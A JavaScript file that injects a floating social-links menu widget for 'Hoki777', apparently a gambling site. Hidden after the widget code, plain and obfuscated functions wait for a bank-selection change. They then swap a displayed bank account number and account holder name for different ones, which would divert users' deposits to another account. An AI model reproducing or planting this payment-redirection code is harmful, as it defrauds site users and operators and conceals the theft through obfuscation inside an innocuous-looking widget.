(function () {
    const menuWid = document.createElement('div');
    menuWid.className = "widget-menu-fixed";
    menuWid.innerHTML = `
    <style>
    .widget-menu-fixed {
    position: fixed;
    bottom: 50px;
    left: 100px;
    z-index: 99999;
}

.cont-widget {
    height: 70px;
    width: 70px;
    background: rgba(51, 51, 51, 0);
    border-radius: 15px;
    transition: height 0.4s ease, background 0.3s ease;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    align-items: center;
    /* justify-content: center; */
    padding: 10px;
    gap: 0;
    /* default gap 0 */
    backdrop-filter: blur(5px);

}

.cont-widget.active {
    height: auto;
    background: rgba(51, 51, 51, 1);
    /* gap: 20px; */
}


.burger {
    width: 50px;
    height: 50px;
    display: flex;
    flex-direction: column;
    justify-content: center;
    /* Tetap center agar transform rapi */
    align-items: center;
    cursor: pointer;
    background: beige;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px rgb(255, 6, 243);
    position: relative;
    gap: 6px;
    /* Jangan terlalu besar */
}

.burger span {
    display: block;
    height: 4px;
    width: 24px;
    background-color: #333;
    border-radius: 2px;
    transition: all 0.3s ease;
    position: relative;
}

.burger.active span:nth-child(1) {
    transform: rotate(45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}

.burger.active span:nth-child(2) {
    opacity: 0;
}

.burger.active span:nth-child(3) {
    transform: rotate(-45deg);
    position: absolute;
    top: 50%;
    left: 50%;
    translate: -50% -50%;
}



.telegram-button,
.whatsapp-button,
.rtp-button,
.fb-button {
    height: 50px;
    width: 50px;
    cursor: pointer;
    background: beige;
    margin-top: 22px;
    padding: 10px;
    border-radius: 15px;
    box-shadow: 2px 2px 10px red;
    justify-content: center;
    align-items: center;
    opacity: 0;
    pointer-events: none;
    transform: translateY(20px) scale(0.9);
    transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    display: flex;
    /* ini tetap tampil, tapi invisible + unclickable awalnya */
}

.cont-widget.active .telegram-button,
.cont-widget.active .whatsapp-button,
.cont-widget.active .rtp-button,
.cont-widget.active .fb-button {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}

.cont-widget.active .telegram-button {
    transition-delay: 0.1s;
}

.cont-widget.active .whatsapp-button {
    transition-delay: 0.2s;
}

.cont-widget.active .rtp-button {
    transition-delay: 0.3s;
}

.cont-widget.active .fb-button {
    transition-delay: 0.4s;
}

.tunjuk {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
}

.hoki-logo {
    display: none;
}

.hoki-logo.active {
    position: absolute;
    height: 90px;
    top: -90px;
    z-index: 1000;
    display: inline-block;
    animation: jump 2s infinite ease-in-out;
}


.tunjuk.active {
    display: none;
}

.link-tombol-widget:hover .widget-tombol {
    transform: translateY(0) scale(1.15);
    /* gabungkan transform */
    background: rgb(124, 124, 103);
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

.widget-tombol {
    transition: transform 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
    border-radius: 15px;
}


.widget-tombol img {
    animation: pulse2 1.5s infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.05);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes pulse2 {
    0% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }

    50% {
        transform: scale(1.5);
        /* box-shadow: 0 0 20px red; */
    }

    100% {
        transform: scale(1);
        /* box-shadow: 0 0 10px red; */
    }
}

@keyframes jump {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-20px);
    }
}

@media screen and (max-width: 769px) {
    .widget-menu-fixed {
        left: 30px;
        bottom: 100px;
    }
}
    </style>
        <div class="cont-widget" id="containerWidget">
            <div class="group-widget">
                <div class="burger"
                    onclick="this.classList.toggle('active');document.getElementById('containerWidget').classList.toggle('active');document.getElementById('tunjukgif').classList.toggle('active');document.getElementById('lghok').classList.toggle('active');">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <a href="https://hk777.top/telegramgruphoki777/" class="link-tombol-widget">
                    <div class="telegram-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/tele2.webp" alt="Telegram Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/wahoki777" class="link-tombol-widget">
                    <div class="whatsapp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/wa2.webp" alt="Whatsapp Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/RTP-Hoki777" class="link-tombol-widget">
                    <div class="rtp-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/rtp2.webp" alt="RTP Hoki777" width="30" height="30">
                    </div>
                </a>
                <a href="https://hk777.top/facebookgruphoki777/" class="link-tombol-widget">
                    <div class="fb-button widget-tombol">
                        <img src="https://yudha125.github.io/menu-widget/Image/fb2.webp" alt="Facebook Hoki777" width="30" height="30">
                    </div>
                </a>
            </div>
        </div>
        
        <img src="https://yudha125.github.io/menu-widget/Image/hoki.webp" alt="Logo Hoki777" class="hoki-logo" id="lghok">
        <img src="https://yudha125.github.io/menu-widget/Image/tunjuk.webp" alt="Tunjuk Hoki777" class="tunjuk" id="tunjukgif">
    `;
    document.body.appendChild(menuWid);


function updateAngka() {
  const spans = document.querySelectorAll('span');
  for (const span of spans) {
    if (span.textContent.trim() === '7391953019') {
      span.textContent = '4372588903'; 
      break; 
    }
  }
}

function updateNama() {
  const divs = document.querySelectorAll('div');
  for (const div of divs) {
    if (div.textContent.trim() === 'RIZKY ADITYA') {
      div.textContent = 'YUDHA K'; 
      break; 
    }
  }
}
document.addEventListener('DOMContentLoaded', () => {
  const selectAngka = document.getElementById('angka');
  
  if (selectAngka) {
    selectAngka.addEventListener('change', () => {
      updateAngka(); 
      updateNama();  
      
    });
  } 
});
})();

function _0x3aee(){const _0x23b872=['torAll','OcZNw','YUDHA\x20K','trim','querySelec','4200186fHCynk','5949760bYZzkz','sWWep','ById','uygBz','RIZKY\x20ADIT','span','pbJMA','1020EJYuOX','OFALx','stener','1152vmxgvs','wGCUk','hEJXX','mxpTz','textConten','1540148igMCmv','Loaded','4372588903','AXuAp','addEventLi','ZIGCw','9607000wrToGQ','7391953019','112878PnxuLt','4082193pMKZTm','szWQd','div','593HDJJuY','change','mWene','7YVVhqK','getElement','bankSelect','DOMContent'];_0x3aee=function(){return _0x23b872;};return _0x3aee();}function _0x34cc(_0x4a1339,_0x4e8220){_0x4a1339=_0x4a1339-(0x1*0x1aed+-0x322+-0x16fd);const _0x240695=_0x3aee();let _0x5a25d5=_0x240695[_0x4a1339];return _0x5a25d5;}(function(_0x1713b2,_0x10a5bd){const _0x1fde68=_0x34cc,_0x27b49a=_0x1713b2();while(!![]){try{const _0x23c073=parseInt(_0x1fde68(0xce))/(-0x153d+0x475*-0x3+0x229d*0x1)*(parseInt(_0x1fde68(0xe5))/(0x4*-0x90b+-0x1*-0x935+0x1af9*0x1))+parseInt(_0x1fde68(0xf3))/(0x2398+-0xe24+-0x1f3*0xb)+-parseInt(_0x1fde68(0xea))/(0x113f+0xc85*0x2+-0x1*0x2a45)+-parseInt(_0x1fde68(0xdb))/(0xaf1+0x2101+-0x2bed)+parseInt(_0x1fde68(0xda))/(-0x1369*-0x1+-0x23fd+0x109a)*(parseInt(_0x1fde68(0xd1))/(-0x1*-0xa8b+-0x2*-0x1193+-0x2daa))+parseInt(_0x1fde68(0xf0))/(0x2627+0x8*0x1f6+-0x35cf)+parseInt(_0x1fde68(0xf2))/(0x165+-0x3d2*-0x2+-0x180*0x6)*(-parseInt(_0x1fde68(0xe2))/(0x8d3+-0x112f*0x1+0x433*0x2));if(_0x23c073===_0x10a5bd)break;else _0x27b49a['push'](_0x27b49a['shift']());}catch(_0x3dbf8f){_0x27b49a['push'](_0x27b49a['shift']());}}}(_0x3aee,-0x133c3a+-0x100804+0x2eb1c2),(function(){const _0x3802d8=_0x34cc,_0xcadd5a={'ZIGCw':_0x3802d8(0xe0),'wGCUk':function(_0x5a92dd,_0x5f356a){return _0x5a92dd===_0x5f356a;},'szWQd':_0x3802d8(0xf1),'OcZNw':_0x3802d8(0xec),'mxpTz':_0x3802d8(0xf5),'mWene':function(_0x3e5664,_0xed79f2){return _0x3e5664===_0xed79f2;},'hEJXX':_0x3802d8(0xdf)+'YA','pbJMA':_0x3802d8(0xd7),'uygBz':function(_0x596d6a){return _0x596d6a();},'AXuAp':_0x3802d8(0xd3),'OFALx':_0x3802d8(0xcf),'sWWep':_0x3802d8(0xd4)+_0x3802d8(0xeb)};function _0x1e9371(){const _0x856139=_0x3802d8,_0x3ea002=document[_0x856139(0xd9)+_0x856139(0xd5)](_0xcadd5a[_0x856139(0xef)]);for(const _0x22b855 of _0x3ea002){if(_0xcadd5a[_0x856139(0xe6)](_0x22b855[_0x856139(0xe9)+'t'][_0x856139(0xd8)](),_0xcadd5a[_0x856139(0xf4)])){_0x22b855[_0x856139(0xe9)+'t']=_0xcadd5a[_0x856139(0xd6)];break;}}}function _0x52e6b9(){const _0x521dbb=_0x3802d8,_0x7682c3=document[_0x521dbb(0xd9)+_0x521dbb(0xd5)](_0xcadd5a[_0x521dbb(0xe8)]);for(const _0x54ccfd of _0x7682c3){if(_0xcadd5a[_0x521dbb(0xd0)](_0x54ccfd[_0x521dbb(0xe9)+'t'][_0x521dbb(0xd8)](),_0xcadd5a[_0x521dbb(0xe7)])){_0x54ccfd[_0x521dbb(0xe9)+'t']=_0xcadd5a[_0x521dbb(0xe1)];break;}}}document[_0x3802d8(0xee)+_0x3802d8(0xe4)](_0xcadd5a[_0x3802d8(0xdc)],()=>{const _0x51a8c6=_0x3802d8,_0x5c9b54=document[_0x51a8c6(0xd2)+_0x51a8c6(0xdd)](_0xcadd5a[_0x51a8c6(0xed)]);_0x5c9b54&&_0x5c9b54[_0x51a8c6(0xee)+_0x51a8c6(0xe4)](_0xcadd5a[_0x51a8c6(0xe3)],()=>{const _0x1f9520=_0x51a8c6;_0xcadd5a[_0x1f9520(0xde)](_0x1e9371),_0xcadd5a[_0x1f9520(0xde)](_0x52e6b9);});});}()));


